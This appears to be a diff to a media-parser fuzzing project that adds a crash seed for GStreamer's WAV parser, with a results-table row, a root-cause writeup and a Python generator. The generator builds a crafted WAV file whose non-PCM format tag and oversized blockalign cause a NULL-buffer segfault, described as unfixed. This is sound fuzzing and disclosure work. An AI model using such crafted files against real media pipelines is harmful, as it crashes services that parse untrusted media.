@@ -25,6 +25,7 @@ ff_webm_duration_cast.webm       clean   UBSAN    clean   clean    clean
 ff_sbg_nan_cast.sbg              clean   clean    clean   clean    clean **
 ff_wav_bext_bigalloc.wav         clean   clean    clean   clean    clean **
 gs_wav_adtl_null_deref.wav       clean   clean    clean   SEGV     clean
+gs_wav_blockalign_zero_take.wav  clean   clean    clean   SEGV     SEGV
 gs_avi_vprp_zero_div.avi         clean   clean    clean   SIGFPE   clean*
 gs_mkv_flac_priv_overread.mkv    clean   clean    clean   OOB-R    clean*
 gs_mkv_bz2_avail_out_overflow.mkv clean   clean    clean   OOB-W†   clean*
@@ -93,6 +94,22 @@ gs_  GStreamer 1.28.0 crashes; FFmpeg 9.0.2 AND 9.1 parse the same bytes
            size - 4 bytes from the adapter without a NULL check: a
            LIST/adtl whose declared body never arrives dereferences NULL
            (gstwavparse.c:937).
+  wav blk  round-down vs round-up on blockalign (unfixed as of 1.28.9;
+           found by the fuzzer itself, see
+           docs/FINDINGS/gstreamer/gst_wavparse_stream_data_null_buffer.md).
+           FFmpeg's wav_read_packet rounds the read size UP to block_align
+           and clamps with FFMIN(size, left) (wavdec.c:803-808), so an
+           inflated blockalign just short-reads. wavparse's fmt sanity
+           rejects blockalign > channels*ceil(bits/8) for PCM
+           (gstwavparse.c:1258-1262) but a non-PCM tag (Voxware AC8,
+           0x0070) takes the default branch; max_buf_size =
+           MAX(0.04*bps, 4096) is then rounded DOWN by
+           `max_buf_size -= max_buf_size % blockalign` (gstwavparse.c:1811)
+           to 0 when blockalign exceeds it, desired = 0 reaches
+           gst_adapter_take_buffer(0), whose g_return_val_if_fail returns
+           NULL (gstadapter.c:1083, warning swallowed by the harness), and
+           the unchecked GST_BUFFER_OFFSET store on the NULL buffer SEGVs
+           (gstwavparse.c:2212).
 
 dual_  one file, both libraries, two independent bugs: Segment Duration
   1e18 (FFmpeg 9.0.2 float-cast overflow: 1e18 * 1e6 * 1000 / 1e6 = 1e21)
@@ -162,6 +179,19 @@ FLAC_OVERREAD = 4
 # 1.28.0 wavparse flushes the 12-byte "LIST"+size+"adtl" header and maps
 # `size - 4` bytes; a size of 12 declares 8 body bytes that never arrive.
 WAV_ADTL_LIST_SIZE = 12
+
+# Round-down crash trigger: blockalign must exceed both the 40 ms byte
+# budget (0.04 * av_bps) and wavparse's MAX_BUFFER_SIZE floor (4096), so
+# `max_buf_size -= max_buf_size % blockalign` lands on 0.
+WAV_FMT_VOXWARE_AC8 = 0x0070  # non-PCM: skips the fmt blockalign sanity
+WAV_BLOCKALIGN = 8192
+WAV_AV_BPS = 88200  # 0.04 * 88200 = 3528 < 4096 -> max_buf_size = 4096
+# Declared data > blockalign so the dataleft < blockalign bail is skipped.
+WAV_DATA_DECLARED = 0x10000
+WAV_DATA_PRESENT = 16
+# gstwavparse.c MAX_BUFFER_SIZE; the other side of the round-down.
+GST_MAX_BUFFER_SIZE = 4096
+GST_BUF_TIME_MS = 40
 
 # Matroska ContentCompression algorithms (matroska-ids.h).
 COMP_ALGO_BZ2 = 1
@@ -284,6 +314,20 @@ def gst_wav_adtl_null_deref():
     return b"RIFF" + le32(len(payload)) + payload
 
 
+def gst_wav_blockalign_zero_take():
+    """Non-PCM fmt with blockalign > 40ms budget -> take_buffer(0) NULL.
+
+    max_buf_size (MAX(0.04*bps, 4096)) rounded down by the blockalign
+    modulo becomes 0, desired = 0, gst_adapter_take_buffer(0) returns
+    NULL and the offset store SEGVs -- 1.28.0 AND 1.28.9 (unfixed).
+    """
+    fmt = le16(WAV_FMT_VOXWARE_AC8) + le16(2) + le32(44100) + le32(WAV_AV_BPS)
+    fmt += le16(WAV_BLOCKALIGN) + le16(8)
+    payload = b"WAVE" + b"fmt " + le32(len(fmt)) + fmt
+    payload += b"data" + le32(WAV_DATA_DECLARED) + b"\x00" * WAV_DATA_PRESENT
+    return b"RIFF" + le32(len(payload)) + payload
+
+
 def gst_avi_vprp_zero_div():
     """vprp chunk with fields=0 -> integer division by zero (1.28.0)."""
 
@@ -358,6 +402,7 @@ def dual_webm_duration_lzo():
 
 GSTREAMER_SEEDS = {
     "wav_adtl_null_deref.wav": gst_wav_adtl_null_deref,
+    "wav_blockalign_zero_take.wav": gst_wav_blockalign_zero_take,
     "avi_vprp_zero_div.avi": gst_avi_vprp_zero_div,
     "mkv_flac_priv_overread.mkv": gst_mkv_flac_priv_overread,
     "mkv_bz2_avail_out_overflow.mkv": gst_mkv_bz2_avail_out_overflow,
